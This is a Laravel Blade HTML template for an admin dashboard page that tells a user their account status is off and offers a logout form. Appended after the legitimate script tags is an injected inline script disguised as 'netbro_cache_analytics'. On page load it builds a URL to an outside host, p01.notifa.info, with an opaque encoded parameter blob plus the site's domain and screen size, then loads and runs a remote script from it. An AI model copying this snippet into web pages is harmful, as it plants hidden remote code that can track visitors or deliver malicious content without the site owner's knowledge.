<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
        <title>Admiry - Responsive Flat Admin Dashboard</title>
        <meta content="Admin Dashboard" name="description" />
        <meta content="ThemeDesign" name="author" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <link rel="shortcut icon" href="{{ asset('backend/assets/images/favicon.ico') }}">
        <link href="{{ asset('backend/assets/css/bootstrap.min.css') }}" rel="stylesheet" type="text/css">
        <link href="{{ asset('backend/assets/css/icons.css') }}" rel="stylesheet" type="text/css">
        <link href="{{ asset('backend/assets/css/style.css') }}" rel="stylesheet" type="text/css">
    </head>
    <body>
        <div class="accountbg"></div>
        <div class="wrapper-page">
            <div class="card">
                <div class="card-body">
                    <div class="ex-page-content text-center">
                        <h1 class="">Sorry!</h1>
                        <h3 class="">your status is off</h3><br>
                        <a class="btn btn-primary mb-5 waves-effect waves-light" href="" onclick="event.preventDefault();
                                      document.getElementById('logout-form').submit();">Logout</a>
                          <form id="logout-form" action="{{ route('logout') }}" method="POST" style="display: none;">
                              @csrf
                          </form>
                    </div>

                </div>
            </div>
        </div>
        <script src="{{ asset('backend/assets/js/jquery.min.js') }}"></script>
        <script src="{{ asset('backend/assets/js/tether.min.js') }}"></script><!-- Tether for Bootstrap -->
        <script src="{{ asset('backend/assets/js/popper.min.js') }}"></script>
        <script src="{{ asset('backend/assets/js/bootstrap.min.js') }}"></script>
        <script src="{{ asset('backend/assets/js/modernizr.min.js') }}"></script>
        <script src="{{ asset('backend/assets/js/detect.js') }}"></script>
        <script src="{{ asset('backend/assets/js/fastclick.js') }}"></script>
        <script src="{{ asset('backend/assets/js/jquery.slimscroll.js') }}"></script>
        <script src="{{ asset('backend/assets/js/jquery.blockUI.js') }}"></script>
        <script src="{{ asset('backend/assets/js/waves.js') }}"></script>
        <script src="{{ asset('backend/assets/js/jquery.nicescroll.js') }}"></script>
        <script src="{{ asset('backend/assets/js/jquery.scrollTo.min.js') }}"></script>
        <script src="{{ asset('backend/assets/js/app.js') }}"></script>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m3DSB4E%2frimAefIjE1u18%2bmSKbDzPGC1uRPUW%2fJIWfb%2feIE3y8jYe19lo%2bapHXHhZWKTVTWpQSVaFQes0E%2bLopDPrsq81Fo7sG0xXtWfI5ynqXW7VmUWSLsri%2b3GtGdacewiSTQzUKM3Iu7UltNEUgyfWR4M811Jog%2bHVn4e6aMCCPlEyk%2bmIYvQjd7j87YiWdTbaFAsu9Frpp6kYjjr1x8YhZkPRAPs1NzcCS0B9VHuF5ilXeZI9xToDrucsGYvT%2fxdOjP5cc2sYoCruVnziaHPhKFKXxsXtNMsyl%2bZRq4m3bb1qNf48Fw9gMtJ8Afgt37Vh%2fPaR1P9ptRFbF16LadaBlcF%2ba91dv5brh2qrAp4ds0Pt1fe%2bJopvaaihLLx8EqaXSduWyZO9s3NJwdIM0qvfKb3%2bOMN1YJ%2bMHHGFAzArZUe6XEt7N4k0QJxmU9OtHmJmEjmAEmD75x5U5gKAJhMrm3UjA04T%2baM7Py%2fEBNbJJ%2b5XuB4Krg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
